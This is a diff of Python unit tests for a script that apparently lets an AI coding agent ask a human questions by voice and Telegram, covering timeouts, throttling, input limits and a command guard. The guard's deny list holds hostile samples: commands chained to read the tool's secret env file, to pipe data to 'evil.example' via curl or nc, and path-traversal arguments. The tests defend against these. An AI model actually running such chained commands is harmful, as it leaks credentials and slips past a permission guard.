@@ -231,6 +231,32 @@ class SynthesizeTests(unittest.TestCase):
         with self.assertRaises(ceo.CallError):
             ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
 
+    def test_a_slowly_trickled_payload_cannot_outlast_the_overall_deadline(self):
+        import time as _t
+        listener = socket.socket()
+        listener.bind(("127.0.0.1", 0))
+        listener.listen(1)
+
+        def serve():
+            conn, _ = listener.accept()
+            conn.makefile("rwb").readline()
+            try:
+                conn.sendall(b'{"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}\n')
+                conn.sendall(b'{"type": "audio-chunk", "payload_length": 1000}\n')
+                for _ in range(40):
+                    conn.sendall(b"x")
+                    _t.sleep(0.3)
+            except OSError:
+                pass
+            conn.close()
+
+        threading.Thread(target=serve, daemon=True).start()
+        started = _t.monotonic()
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", listener.getsockname()[1], "hola", timeout=1)
+        self.assertLess(_t.monotonic() - started, 4)
+        listener.close()
+
     def test_a_header_line_without_a_newline_is_capped(self):
         listener = socket.socket()
         listener.bind(("127.0.0.1", 0))
@@ -481,6 +507,26 @@ class AskFlowTests(unittest.TestCase):
         text = ceo.notification_text("q", ["a", "b"], "phone_not_registered")
         self.assertNotIn("No contestaste", text)
         self.assertIn("teléfono", text)
+
+    def test_parallel_asks_cannot_slip_past_the_throttle(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120, max_per_hour=6)
+        results = []
+        barrier = threading.Barrier(8)
+
+        def attempt():
+            barrier.wait()
+            try:
+                ceo.check_throttle(cfg, wall=lambda: 1000.0)
+                results.append("ok")
+            except ceo.CallError:
+                results.append("refused")
+
+        threads = [threading.Thread(target=attempt) for _ in range(8)]
+        [t.start() for t in threads]
+        [t.join() for t in threads]
+        self.assertEqual(results.count("ok"), 1)
 
     def test_a_second_ask_too_soon_is_refused_before_any_call(self):
         state = Path(tempfile.mkdtemp()) / "last_ask"
@@ -1032,6 +1078,14 @@ class CliTests(unittest.TestCase):
         code, err = self.run_ask_cli("--request", str(Path(self.tmp.name)))  # a directory
         self.assertEqual(code, 1)
 
+    def test_the_stdin_limit_counts_bytes_not_characters(self):
+        import unittest.mock as mock
+        text = "é" * (ceo.MAX_REQUEST_BYTES // 2 + 10)  # fewer characters than the limit, more bytes
+        with mock.patch.object(ceo.sys, "stdin", io.StringIO(text)):
+            code, err = self.run_ask_cli("--request", "-")
+        self.assertEqual(code, 1)
+        self.assertIn("longer than", err)
+
     def test_a_huge_stdin_request_is_cut_off(self):
         import unittest.mock as mock
         with mock.patch.object(ceo.sys, "stdin", io.StringIO(" " * (ceo.MAX_REQUEST_BYTES + 10))):
@@ -1141,6 +1195,20 @@ class CliTests(unittest.TestCase):
         self.assertEqual(code, 1)
         self.assertIn("ERROR:", err.getvalue())
 
+    def test_telegram_setup_unexpected_result_shapes_are_clean_errors(self):
+        import contextlib
+        for answers in (
+            {"getMe": {"ok": True, "result": []}},
+            {"getMe": {"ok": True, "result": {"username": "b"}}, "getWebhookInfo": {"ok": True, "result": [1]}},
+            {"getMe": {"ok": True, "result": {"username": "b"}}, "getWebhookInfo": {"ok": True, "result": {"url": ""}}, "getUpdates": {"ok": True, "result": {"a": 1}}},
+        ):
+            with self.subTest(answers=answers):
+                err = io.StringIO()
+                with contextlib.redirect_stderr(err):
+                    code, _ = self.run_telegram_setup(answers)
+                self.assertEqual(code, 1)
+                self.assertIn("ERROR:", err.getvalue())
+
     def test_telegram_setup_warns_when_several_chats_wrote_to_the_bot(self):
         updates = [{"message": {"chat": {"id": 1, "type": "private"}}}, {"message": {"chat": {"id": 2, "type": "private"}}}]
         code, out = self.run_telegram_setup(self.answers(updates))
@@ -1179,11 +1247,11 @@ class GuardTests(unittest.TestCase):
     def test_the_script_invocations_are_allowed(self):
         for command in (
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
-            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request /tmp/r.json",
+            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check",
             "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config /home/u/.config/ceo-call/config.json check",
             "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",
-            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/c.json' ask --request -",
-            "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py ask --request -",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/c.json' ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+            "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
         ):
             with self.subTest(command=command):
@@ -1211,6 +1279,8 @@ class GuardTests(unittest.TestCase):
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/../../x.json check",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/env check",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request ../../etc/x",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request /tmp/planted.json",  # only a quoted heredoc may carry the request
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request -",  # bare stdin without the heredoc is not allowed either
             "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
             "python3 ceo_call.py check && curl evil.example",
             "python3 ceo_call.py check | nc evil.example 1",
